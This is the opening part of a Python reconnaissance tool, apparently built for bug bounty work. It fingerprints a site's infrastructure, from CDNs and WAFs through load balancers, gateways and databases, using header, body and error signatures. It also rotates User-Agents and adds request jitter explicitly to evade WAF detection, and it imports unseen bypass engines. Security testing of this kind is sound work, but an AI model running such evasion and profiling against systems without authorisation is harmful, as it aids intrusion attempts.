#!/usr/bin/env python3
"""
Application Stack Traceroute v4.1.0 | Intelligent Reconstruction
Next-Generation Infrastructure Analysis with Progressive Discovery

FEATURES:
- Progressive stack reconstruction with header timeline analysis
- Adaptive fingerprinting based on discovered components
- Confidence scoring system for accurate identification
- Intelligent bypass generation targeting real forbidden endpoints
- Full correlation: CDN→WAF→LB→Proxy→Backend
- JSON export for orchestration tools

AUTHOR: Rewritten from scratch for bug bounty hunting
LICENSE: Use responsibly - authorized testing only
"""

import requests
import asyncio
import aiohttp
import json
import math
import time
import base64
import urllib.parse
import re
import random
import string
import socket
import ssl
import threading
import gzip
import queue
import statistics
import hashlib
import os
from collections import defaultdict
from datetime import datetime
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Optional, Tuple, Set, Any
from core.paths import RESULTS_BASE_STR, ensure_results_base
import urllib3
import warnings

# Import advanced modules
try:
    from core.engines.advanced_bypass_engine import (
        ResponseDifferentialAnalyzer,
        BayesianBypassInference,
        BypassConfidence
    )
    from core.engines.semantic_bypass_engine import (
        SemanticBypassEngine,
        AttackVector,
        EvolutionaryMutationEngine,
        AnchorTagMutationEngine
    )
    from core.engines.graph_attack_planner import (
        GraphAttackPlanner,
        AttackCategory
    )
    from core.engines.intelligent_bypass_validator import (
        IntelligentBypassValidator,
        ValidationConfidence
    )
    ADVANCED_MODULES_AVAILABLE = True
except ImportError as e:
    ADVANCED_MODULES_AVAILABLE = False
    print(f"⚠️  Advanced modules not available - using standard tests only ({e})")

# SQLite Learning System
try:
    from core.learning.learning_db import LearningDB, _hash_target, _build_stack_signature
    LEARNING_DB_AVAILABLE = True
except ImportError:
    LEARNING_DB_AVAILABLE = False

# Optional debug logger (same module used by the crawler)
try:
    from core.debug_logger import DebugLogger, DebugSession
    DEBUG_LOGGER_AVAILABLE = True
except ImportError:
    try:
        import sys as _sys
        from pathlib import Path as _Path
        _parent = str(_Path(__file__).parent.parent)
        if _parent not in _sys.path:
            _sys.path.insert(0, _parent)
        from debug_logger import DebugLogger, DebugSession
        DEBUG_LOGGER_AVAILABLE = True
    except ImportError:
        DEBUG_LOGGER_AVAILABLE = False

# Suppress SSL warnings for security testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')


class RateLimiter:
    """Rate limiter with jitter to prevent overwhelming target servers and avoid WAF detection"""

    def __init__(self, requests_per_second: float = 2.0, jitter: float = 0.3):
        self.delay = 1.0 / requests_per_second
        self.jitter = jitter  # Random jitter factor (0.0 - 1.0)
        self.last_request = 0
        self.lock = threading.Lock()

    def _jittered_delay(self) -> float:
        """Calculate delay with random jitter to avoid detection patterns"""
        base = self.delay
        if self.jitter > 0:
            base += random.uniform(0, self.delay * self.jitter)
        return base

    def wait(self):
        """Wait if necessary to respect rate limit with jitter"""
        with self.lock:
            elapsed = time.time() - self.last_request
            target_delay = self._jittered_delay()
            if elapsed < target_delay:
                time.sleep(target_delay - elapsed)
            self.last_request = time.time()

    async def await_async(self):
        """Async version of wait with jitter"""
        elapsed = time.time() - self.last_request
        target_delay = self._jittered_delay()
        if elapsed < target_delay:
            await asyncio.sleep(target_delay - elapsed)
        self.last_request = time.time()


# Expanded User-Agent pool for rotation (modern browsers across platforms)
USER_AGENT_POOL = [
    # Chrome - Windows
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # Chrome - macOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    # Chrome - Linux
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    # Firefox - Windows
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    # Firefox - macOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:121.0) Gecko/20100101 Firefox/121.0',
    # Firefox - Linux
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    # Edge
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    # Safari - macOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    # Safari - iOS
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
]


def get_random_user_agent() -> str:
    """Get a random User-Agent string from the pool"""
    return random.choice(USER_AGENT_POOL)


class ProgressiveStackAnalyzer:
    """
    Analyzes infrastructure stack progressively using header timeline,
    behavioral testing, and timing analysis for accurate reconstruction.
    """
    
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(target_url)
        self.session = requests.Session()
        self.session.verify = False

        # Rate limiter to prevent overwhelming target
        self.rate_limiter = RateLimiter(requests_per_second=3.0)

        # Stack reconstruction data
        self.stack = {
            'layers': [],           # Ordered list of discovered layers
            'timeline': [],         # Header processing timeline
            'confidence': {},       # Confidence scores per component
            'correlations': []      # Layer relationships
        }

        # Fingerprint data (YOU will populate this)
        self.fingerprints = self.initialize_fingerprints()

        # Compiled regex cache for performance
        self.regex_cache = {}
        
    def initialize_fingerprints(self) -> Dict:
        """
        Initialize comprehensive fingerprint signatures for all stack types.
        Optimized from v2.8 refactored - only essential patterns.
        """
        return {
            'cdn_detection': {
                'cloudflare': {
                    'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id', 'cf-connecting-ip'],
                    'body_patterns': ['cloudflare', 'cf-ray', 'ray id:', 'checking your browser'],
                    'behavioral_paths': ['/cdn-cgi/trace', '/cdn-cgi/'],
                    'timing_signature': {'avg_ms': 30, 'jitter': 15}
                },
                'aws_cloudfront': {
                    'headers': ['x-amz-cf-id', 'x-amz-cf-pop', 'x-amzn-trace-id'],
                    'body_patterns': ['cloudfront', 'generated by cloudfront'],
                    'behavioral_paths': [],
                    'timing_signature': {'avg_ms': 40, 'jitter': 20}
                },
                'fastly': {
                    'headers': ['x-served-by', 'x-cache-hits', 'fastly-debug-digest', 'x-timer'],
                    'body_patterns': ['fastly error', 'varnish', 'fastly shield'],
                    'behavioral_paths': [],
                    'timing_signature': {'avg_ms': 35, 'jitter': 18}
                },
                'akamai': {
                    'headers': ['akamai-origin-hop', 'akamai-cache-status', 'true-client-ip'],
                    'body_patterns': ['akamai', 'reference #', 'ghost ip'],
                    'behavioral_paths': [],
                    'timing_signature': {'avg_ms': 45, 'jitter': 22}
                },
                'azure_cdn': {
                    'headers': ['x-azure-ref', 'x-msedge-ref', 'x-azure-fdid'],
                    'body_patterns': ['azure cdn', 'microsoft azure'],
                    'behavioral_paths': [],
                    'timing_signature': {'avg_ms': 50, 'jitter': 25}
                },
                'maxcdn': {
                    'headers': ['x-maxcdn-pop', 'x-sp-edge-pop'],
                    'body_patterns': ['maxcdn', 'netdna', 'stackpath'],
                    'behavioral_paths': [],
                    'timing_signature': {'avg_ms': 40, 'jitter': 20}
                }
            },

            'waf_detection': {
                'cloudflare_waf': {
                    'headers': ['cf-ray', 'cf-mitigated'],
                    'body_patterns': ['cloudflare', 'ray id:', 'error 1020', 'error 1006', 'ddos protection'],
                    'response_codes': [403, 503, 520]
                },
                'aws_waf': {
                    'headers': ['x-amzn-waf-action', 'x-amz-apigw-id', 'x-amzn-requestid'],
                    'body_patterns': ['aws waf', 'forbidden', 'request blocked'],
                    'response_codes': [403]
                },
                'modsecurity': {
                    'headers': ['mod_security', 'modsec'],
                    'body_patterns': ['mod_security', 'modsecurity', 'modsec', 'not acceptable', 'this error was generated by mod_security'],
                    'response_codes': [403, 406, 501]
                },
                'imperva': {
                    'headers': ['x-iinfo', 'incap-ses', 'visid_incap'],
                    'body_patterns': ['incapsula', 'imperva', 'access denied', 'unauthorized access'],
                    'response_codes': [403]
                },
                'sucuri': {
                    'headers': ['x-sucuri-id', 'x-sucuri-cache', 'x-sucuri-block'],
                    'cookies': ['sucuri_cloudproxy_uuid_'],
                    'body_patterns': ['sucuri', 'access denied', 'blocked by sucuri'],
                    'error_pages': ['access denied', 'questions?'],
                    'response_codes': [403]
                },
                'f5_asm': {
                    'headers': ['x-wa-info', 'x-cnection', 'x-f5-bigip', 'f5-bigip', 'bigip'],
                    'body_patterns': ['f5', 'bigip', 'the requested url was rejected', 'request rejected'],
                    'response_codes': [403, 406]
                },
                'barracuda': {
                    'headers': ['x-barracuda-url', 'x-barra-counter'],
                    'body_patterns': ['barracuda', 'bnsv', 'barra', 'blocked by barracuda'],
                    'response_codes': [403, 404]
                },
                'fortinet': {
                    'headers': [],
                    'body_patterns': ['fortigate', 'fortiweb', 'fortigate waf'],
                    'response_codes': [403]
                },
                'naxsi': {
                    'headers': [],
                    'body_patterns': ['naxsi', 'unusual url', 'blocked by naxsi'],
                    'response_codes': [403]
                },
                'wallarm': {
                    'headers': [],
                    'body_patterns': ['wallarm', 'blocked by wallarm'],
                    'response_codes': [403]
                },
                'azure_waf': {
                    'headers': ['x-azure-ref', 'x-msedge-ref'],
                    'body_patterns': ['applicationgateway', 'azure waf'],
                    'response_codes': [403]
                },
                'citrix_netscaler': {
                    'headers': ['ns_af', 'citrix-transactionid', 'citrix_ns_id', 'netscaler'],
                    'body_patterns': ['citrix', 'netscaler', 'access denied'],
                    'response_codes': [403]
                },
                'radware': {
                    'headers': ['x-rdwr-', 'x-radware'],
                    'body_patterns': ['radware', 'appwall'],
                    'response_codes': [403]
                },
                'paloalto': {
                    'headers': [],
                    'body_patterns': ['palo alto', 'pan-os', 'blocked by policy'],
                    'response_codes': [403]
                },
                'checkpoint': {
                    'headers': [],
                    'body_patterns': ['checkpoint', 'fw-1', 'access denied'],
                    'response_codes': [403]
                },
                'sophos': {
                    'headers': [],
                    'body_patterns': ['sophos', 'utm'],
                    'response_codes': [403]
                },
                'webknight': {
                    'headers': [],
                    'body_patterns': ['webknight', 'blocked by webknight'],
                    'response_codes': [403]
                },
                'akamai': {
                    'headers': ['akamai-origin-hop', 'akamai-transformed', 'x-akamai-transformed'],
                    'response_codes': [403, 429],
                    'body_patterns': ['akamai', 'reference #', 'akamai ghost'],
                },
                'imperva_incapsula': {
                    'headers': ['x-iinfo', 'x-cdn'],
                    'response_codes': [403, 406, 429],
                    'body_patterns': ['incapsula', 'imperva', 'request unsuccessful'],
                },
                'fortinet_fortiweb': {
                   'headers': ['x-forwarded-for'],
                    'response_codes': [403],
                    'body_patterns': ['fortinet', 'fortigate', 'fortiweb', 'blocked by fortinet'],
                },
                'checkpoint_cloudguard': {
                    'headers': ['cp_session_id'],
                    'response_codes': [403],
                    'body_patterns': ['checkpoint', 'cloudguard', 'access denied'],
                },
                # Open Source WAFs
                'nginx_naxsi': {
                    'headers': ['naxsi/waf'],
                    'response_codes': [403, 418],
                    'body_patterns': ['naxsi', 'unusual request'],
                },

                    # Specialized/Security-focused WAFs
                    'wordfence': {
                        'headers': [],
                        'cookies': ['wfwaf-authcookie'],
                        'response_codes': [403, 503],
                        'body_patterns': ['wordfence', 'generated by wordfence'],
                        'error_pages': ['this response was generated by wordfence', 'your access to this site']
                    },
                    'wallarm': {
                        'headers': ['x-wallarm-mode'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['wallarm', 'blocked by wallarm'],
                        'error_pages': ['request blocked']
                    },
                    'radware': {
                        'headers': ['x-defended-by'],
                        'cookies': ['rdx'],
                        'response_codes': [403],
                        'body_patterns': ['radware', 'application firewall'],
                        'error_pages': ['unauthorized request blocked']
                    },
                    'edgecast': {
                        'headers': ['server: ecs'],
                        'cookies': [],
                        'response_codes': [403, 400],
                        'body_patterns': ['edgecast', 'unauthorized request'],
                        'error_pages': ['unauthorized request']
                    },
                    'alert_logic': {
                        'headers': ['al_sess', 'al_lb'],
                        'cookies': ['al_sess'],
                        'response_codes': [403],
                        'body_patterns': ['alert logic', 'alertlogic'],
                        'error_pages': ['access denied']
                    },
                    'approach': {
                        'headers': ['approach'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['approach', 'blocked by approach'],
                        'error_pages': ['blocked by approach']
                    },
                    'armor': {
                        'headers': ['armor'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['armor defense'],
                        'error_pages': ['blocked by armor']
                    },
                    'aws_elb': {
                        'headers': ['awsalb', 'awsalbcors'],
                        'cookies': ['awsalb', 'awsalbcors'],
                        'response_codes': [403, 503],
                        'body_patterns': ['aws', 'application load balancer'],
                        'error_pages': ['service temporarily unavailable']
                    },
                    'baidu_yunjiasu': {
                        'headers': ['yunjiasu-nginx'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['yunjiasu', 'baidu'],
                        'error_pages': ['blocked by yunjiasu']
                    },
                    'bekchy': {
                        'headers': ['bekchy - backend server'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['bekchy'],
                        'error_pages': ['blocked by bekchy']
                    },
                    'binarysec': {
                        'headers': ['binarysec'],
                        'cookies': [],
                        'response_codes': [403, 400],
                        'body_patterns': ['binarysec', 'blocked by binarysec'],
                        'error_pages': ['request blocked by binarysec']
                    },
                    'blockdos': {
                        'headers': ['blockdos.net'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['blockdos', 'you have been blocked'],
                        'error_pages': ['you have been blocked']
                    },
                    'cerber': {
                        'headers': [],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['cerber security', 'access denied'],
                        'error_pages': ['we are sorry, but this page is blocked', 'cerber security']
                    },
                    'chinacache': {
                        'headers': ['powered-by-chinacache'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['chinacache'],
                        'error_pages': ['blocked by chinacache']
                    },
                    'cloudbric': {
                        'headers': ['x-cloudbric-request-id'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['cloudbric', 'blocked by cloudbric'],
                        'error_pages': ['malicious/abnormal request blocked']
                    },
                    'comodo': {
                        'headers': ['protected-by', 'server: cwaf'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['comodo', 'protected by comodo waf'],
                        'error_pages': ['access denied']
                    },
                    'deny_all': {
                        'headers': ['sessioncookie'],
                        'cookies': ['sessioncookie'],
                        'response_codes': [403],
                        'body_patterns': ['denyall', 'condition intercepted'],
                        'error_pages': ['condition intercepted']
                    },
                    'dotdefender': {
                        'headers': ['x-dotdefender-denied'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['dotdefender', 'applicure dotdefender'],
                        'error_pages': ['dotdefender blocked your request']
                    },
                    'hyperguard': {
                        'headers': ['hyperguard'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['hyperguard', 'unauthorized request blocked'],
                        'error_pages': ['unauthorized request blocked']
                    },
                    'jiasule': {
                        'headers': ['jiasule-waf'],
                        'cookies': ['jsluid', '__jsluid'],
                        'response_codes': [403, 400],
                        'body_patterns': ['jiasule', 'static.jiasule.com'],
                        'error_pages': ['notice-jiasule']
                    },
                    'knownsec': {
                        'headers': ['ks-waf'],
                        'cookies': [],
                        'response_codes': [403, 555],
                        'body_patterns': ['knownsec', 'ks-waf', 'blocked by knownsec'],
                        'error_pages': ['request denied by knownsec']
                    },
                    'malcare': {
                        'headers': [],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['malcare', 'firewall', 'blocked by malcare'],
                        'error_pages': ['blocked because of malicious activities']
                    },
                    'newdefend': {
                        'headers': ['newdefend'],
                        'cookies': [],
                        'response_codes': [403, 412],
                        'body_patterns': ['newdefend', 'request blocked'],
                        'error_pages': ['request blocked']
                    },
                    'nsfocus': {
                        'headers': ['nsfocus'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['nsfocus', 'blocked by nsfocus'],
                        'error_pages': ['blocked by nsfocus waf']
                    },
                    'palo_alto': {
                        'headers': ['server: pa-vm'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['palo alto', 'pan-os'],
                        'error_pages': ['access denied']
                    },
                    'profense': {
                        'headers': ['profense'],
                        'cookies': [],
                        'response_codes': [403, 406],
                        'body_patterns': ['profense', 'plixer'],
                        'error_pages': ['request blocked by profense']
                    },
                    'reblaze': {
                        'headers': ['rbzid'],
                        'cookies': ['rbzid'],
                        'response_codes': [403],
                        'body_patterns': ['reblaze', 'current request blocked'],
                        'error_pages': ['current request blocked']
                    },
                    'safe3': {
                        'headers': ['safe3waf'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['safe3', 'safe3 web application firewall'],
                        'error_pages': ['safe3 web application firewall']
                    },
                    'safedog': {
                        'headers': ['server: safedog', 'safedog'],
                        'cookies': ['safedog-flow-item'],
                        'response_codes': [403, 404, 405],
                        'body_patterns': ['safedog', 'wangzhan', '404 not found'],
                        'error_pages': ['404 not found']
                    },
                    'secupress': {
                        'headers': [],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['secupress', 'blocked by secupress'],
                        'error_pages': ['cool, you are totally forbidden']
                    },
                    'securi': {
                        'headers': ['x-sucuri-id'],
                        'cookies': ['sucuri_cloudproxy_uuid'],
                        'response_codes': [403],
                        'body_patterns': ['sucuri', 'cloudproxy'],
                        'error_pages': ['access denied']
                    },
                    'senginx': {
                        'headers': ['senginx'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['senginx', 'blocked by senginx'],
                        'error_pages': ['blocked by senginx']
                    },
                    'shadow_daemon': {
                        'headers': ['shadowd_ui'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['shadowd', 'shadow daemon'],
                        'error_pages': ['request blocked by shadow daemon']
                    },
                    'shieldsecurity': {
                        'headers': [],
                        'cookies': ['icwp-wpsf'],
                        'response_codes': [403],
                        'body_patterns': ['shield security', 'icwp'],
                        'error_pages': ['you were blocked by the shield']
                    },
                    'sonicwall': {
                        'headers': ['sonicwall'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['sonicwall', 'this request is blocked'],
                        'error_pages': ['this request is blocked by sonicwall']
                    },
                    'sophos': {
                        'headers': ['spdy'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['sophos', 'blocked by sophos'],
                        'error_pages': ['blocked by sophos utm']
                    },
                    'stingray': {
                        'headers': ['x-mapping'],
                        'cookies': [],
                        'response_codes': [403, 500],
                        'body_patterns': ['stingray', 'riverbed stingray'],
                        'error_pages': ['request rejected']
                    },
                    'tencent_cloud': {
                        'headers': ['server: tencent-cls'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['tencent', 'qcloud'],
                        'error_pages': ['blocked by tencent cloud waf']
                    },
                    'usp_secure_entry': {
                        'headers': ['usp-se'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['usp secure entry server'],
                        'error_pages': ['request denied by usp secure entry server']
                    },
                    'varnish': {
                        'headers': ['x-varnish'],  # via rimosso: non discriminante per WAF
                        'cookies': [],
                        'response_codes': [403, 503],
                        'body_patterns': ['varnish', 'guru meditation'],
                        'error_pages': ['guru meditation', 'varnish cache server']
                    },
                    'webknight': {
                        'headers': ['webknight'],
                        'cookies': [],
                        'response_codes': [403, 999],
                        'body_patterns': ['webknight', 'http error 999'],
                        'error_pages': ['blocked by webknight']
                    },
                    'yundun': {
                        'headers': ['server: yundun'],
                        'cookies': ['yunsuo_session'],
                        'response_codes': [403],
                        'body_patterns': ['yundun', 'blocked by yundun'],
                        'error_pages': ['blocked by yundun']
                    },
                    'zenedge': {
                        'headers': ['x-zen-fury'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['zenedge', 'request blocked'],
                        'error_pages': ['request has been blocked']
                    }

            },

            'load_balancer_detection': {
                'haproxy': {
                    'headers': ['x-haproxy', 'x-haproxy-server-state'],
                    'body_patterns': ['haproxy', 'statistics report for haproxy'],
                    'behavioral_paths': ['/haproxy?stats']
                },
                'nginx_lb': {
                    'headers': ['x-nginx-lb', 'x-upstream-addr', 'x-upstream-status'],
                    'body_patterns': ['nginx', 'nginx load balancer'],
                    'behavioral_paths': ['/nginx_status']
                },
                'aws_alb': {
                    'headers': ['x-amzn-trace-id', 'x-amzn-requestid'],
                    'body_patterns': ['application load balancer', 'aws alb'],
                    'behavioral_paths': []
                },
                'aws_elb': {
                    'headers': ['x-amzn-elb-id'],
                    'body_patterns': ['elastic load balancing'],
                    'behavioral_paths': []
                },
                'azure_lb': {
                    'headers': ['x-azure-ref', 'x-azure-socketid'],
                    'body_patterns': ['azure load balancer'],
                    'behavioral_paths': []
                },
                'gcp_lb': {
                    'headers': [],
                    'via_patterns': ['1.1 google', '1.1 gfe', 'gfe'],
                    'body_patterns': ['google cloud load balancer', 'gclb'],
                    'behavioral_paths': []
                },
                'f5_bigip': {
                    'headers': ['x-wa-info'],
                    'body_patterns': ['f5 networks', 'bigip'],
                    'behavioral_paths': []
                },
                'citrix_netscaler_lb': {
                    'headers': ['ns_af'],  # via rimosso: troppo generico
                    'body_patterns': ['netscaler'],
                    'behavioral_paths': []
                }
            },

            'proxy_detection': {
                'varnish': {
                    'headers': ['x-varnish'],  # via rimosso: usato da Fastly, Varnish, molti altri
                    'via_patterns': ['varnish'],
                    'body_patterns': ['varnish', 'guru meditation'],
                    'behavioral_paths': ['/varnish-status']
                },
                'squid': {
                    'headers': ['x-squid-error', 'x-cache-lookup'],  # x-squid non standard; via rimosso
                    'via_patterns': ['squid'],
                    'body_patterns': ['squid', 'cache access denied'],
                    'behavioral_paths': []
                },
                'nginx_proxy': {
                    'headers': ['x-nginx-proxy'],  # via rimosso: nginx non si identifica via Via
                    'body_patterns': ['nginx'],
                    'behavioral_paths': []
                },
                'apache_traffic_server': {
                    'headers': ['x-ats-request-id', 'x-check-cacheable'],  # via rimosso
                    'via_patterns': ['traffic-server', 'ats/'],
                    'body_patterns': ['apache traffic server'],
                    'behavioral_paths': []
                },
                'traefik': {
                    'headers': ['x-traefik-request-id'],
                    'body_patterns': ['traefik'],
                    'behavioral_paths': ['/api', '/dashboard']
                },
                'envoy_proxy': {
                    'headers': ['x-envoy-upstream-service-time', 'x-envoy-decorator-operation'],
                    'body_patterns': ['envoy'],
                    'behavioral_paths': []
                }
            },

            'api_gateway_detection': {
                'kong': {
                    'headers': ['x-kong-proxy-latency', 'x-kong-upstream-latency',
                                'x-kong-request-id'],  # via rimosso: non discriminante
                    'body_patterns': ['kong', 'kong gateway'],
                    'behavioral_paths': ['/']
                },
                'aws_api_gateway': {
                    'headers': ['x-amzn-requestid', 'x-amzn-trace-id', 'x-amz-apigw-id'],
                    'body_patterns': ['missing authentication token', 'amazon api gateway'],
                    'behavioral_paths': []
                },
                'azure_apim': {
                    'headers': ['ocp-apim-trace', 'ocp-apim-subscription-key'],
                    'body_patterns': ['azure api management', 'apim'],
                    'behavioral_paths': []
                },
                'tyk': {
                    'headers': ['x-tyk-api-key', 'x-tyk-request-id'],
                    'body_patterns': ['tyk gateway', 'tyk'],
                    'behavioral_paths': []
                },
                'apigee': {
                    'headers': ['x-apigee'],
                    'body_patterns': ['apigee', 'error.type.oauth'],
                    'behavioral_paths': []
                },
                'zuul': {
                    'headers': ['x-zuul', 'x-netflix-zuul'],
                    'body_patterns': ['zuul', 'netflix zuul'],
                    'behavioral_paths': []
                },
                'ambassador': {
                    'headers': ['x-envoy-upstream-service-time'],
                    'body_patterns': ['ambassador', 'envoy'],
                    'behavioral_paths': []
                }
            },

            'service_mesh_detection': {
                'istio': {
                    'headers': ['x-envoy-upstream-service-time', 'x-istio-attributes', 'x-b3-traceid', 'x-b3-spanid'],
                    'body_patterns': ['envoy', 'istio', 'istio-proxy'],
                    'behavioral_paths': ['/stats/prometheus', '/ready', '/healthz/ready']
                },
                'linkerd': {
                    'headers': ['l5d-dst-service', 'l5d-success-class', 'x-linkerd-id'],
                    'body_patterns': ['linkerd', 'conduit'],
                    'behavioral_paths': []
                },
                'consul': {
                    'headers': ['x-consul-token'],
                    'body_patterns': ['consul', 'consul connect'],
                    'behavioral_paths': ['/v1/health']
                },
                'envoy': {
                    'headers': ['x-envoy-upstream-service-time', 'x-envoy-decorator-operation'],
                    'body_patterns': ['envoy proxy'],
                    'behavioral_paths': ['/server_info', '/stats']
                }
            },

            'serverless_detection': {
                'aws_lambda': {
                    'headers': ['x-amzn-requestid', 'x-amzn-trace-id', 'x-lambda-request-id'],
                    'body_patterns': ['lambda', 'function invocation'],
                    'behavioral_paths': []
                },
                'google_cloud_functions': {
                    'headers': ['function-execution-id', 'x-cloud-trace-context'],
                    'body_patterns': ['cloud functions'],
                    'behavioral_paths': []
                },
                'azure_functions': {
                    'headers': ['x-azure-requestid', 'x-ms-request-id'],
                    'body_patterns': ['azure functions'],
                    'behavioral_paths': []
                },
                'cloudflare_workers': {
                    'headers': ['cf-ray', 'cf-worker'],
                    'body_patterns': ['cloudflare workers', 'workers.dev'],
                    'behavioral_paths': []
                },
                'netlify_functions': {
                    'headers': ['x-nf-request-id', 'x-netlify'],
                    'body_patterns': ['netlify', 'netlify functions'],
                    'behavioral_paths': []
                },
                'vercel_functions': {
                    'headers': ['x-vercel-id', 'x-vercel-cache'],
                    'body_patterns': ['vercel', 'now.sh'],
                    'behavioral_paths': []
                }
            },

            'container_orchestration_detection': {
                'kubernetes': {
                    'headers': ['x-kubernetes', 'x-k8s', 'x-pod-name', 'x-namespace'],
                    'body_patterns': ['kubernetes', 'k8s'],
                    'behavioral_paths': ['/healthz', '/readyz', '/livez']
                },
                'docker': {
                    'headers': ['x-docker', 'x-container-id'],
                    'body_patterns': ['docker', 'container id'],
                    'behavioral_paths': []
                },
                'aws_ecs': {
                    'headers': ['x-ecs-task', 'x-amzn-trace-id'],
                    'body_patterns': ['ecs task', 'fargate'],
                    'behavioral_paths': []
                },
                'openshift': {
                    'headers': ['x-openshift-route'],
                    'body_patterns': ['openshift', 'red hat openshift'],
                    'behavioral_paths': ['/healthz']
                },
                'docker_swarm': {
                    'headers': ['x-docker-swarm', 'x-swarm-node'],
                    'body_patterns': ['docker swarm'],
                    'behavioral_paths': []
                },
                'nomad': {
                    'headers': ['x-nomad-alloc-id'],
                    'body_patterns': ['nomad', 'hashicorp nomad'],
                    'behavioral_paths': []
                }
            },

            'database_proxy_detection': {
                'pgbouncer': {
                    'headers': ['x-pgbouncer'],
                    'body_patterns': ['pgbouncer', 'postgres connection pool'],
                    'behavioral_paths': []
                },
                'mysql_proxy': {
                    'headers': ['x-mysql-proxy'],
                    'body_patterns': ['mysql proxy', 'proxysql'],
                    'behavioral_paths': []
                },
                'redis_sentinel': {
                    'headers': ['x-redis-sentinel'],
                    'body_patterns': ['redis sentinel', 'sentinel mode'],
                    'behavioral_paths': []
                },
                'mongodb_proxy': {
                    'headers': ['x-mongodb-proxy'],
                    'body_patterns': ['mongodb proxy', 'mongos'],
                    'behavioral_paths': []
                },
                'proxysql': {
                    'headers': [],
                    'body_patterns': ['proxysql', 'mysql load balancer'],
                    'behavioral_paths': []
                }
            },

            # Database inference: DB non è mai esposto direttamente via HTTP.
            # La detection è inferenziale: errori nel body, header proxy-DB,
            # correlazione con backend rilevato, path admin (phpmyadmin ecc.)
            'database_detection': {
                'mysql_mariadb': {
                    'proxy_headers': ['x-mysql-proxy'],
                    'error_patterns': [
                        'you have an error in your sql syntax',
                        'mysql_fetch_array', 'mysql_num_rows',
                        'call to undefined function mysql',
                        'supplied argument is not a valid mysql result',
                        'com.mysql.jdbc', 'pdo::prepare', 'pdoexception',
                        'access denied for user.*@.*mysql',
                        'table.*doesn.*exist', 'unknown column',
                    ],
                    'body_patterns': [],
                    'stack_trace_patterns': ['mysqli_', 'pdo\\\\mysql', 'doctrine\\\\dbal'],
                    'backend_correlation': ['php', 'ruby', 'perl', 'python'],
                    'behavioral_paths': ['/phpmyadmin', '/pma', '/adminer',
                                         '/mysql', '/db', '/database'],
                },
                'postgresql': {
                    'proxy_headers': ['x-pgbouncer'],
                    'error_patterns': [
                        'pg_query', 'pg_execute', 'pgerror',
                        'activerecord::statementinvalid',
                        'org.postgresql.util.psqlexception',
                        'unterminated quoted string at or near',
                        'pg_hba.conf entry for host',
                        'fatal: password authentication failed for user',
                        'dbal\\\\driver\\\\pdopgsqlexception',
                    ],
                    'body_patterns': [],
                    'stack_trace_patterns': ['activerecord', 'psycopg2', 'asyncpg',
                                              'pg.pool', 'node-postgres'],
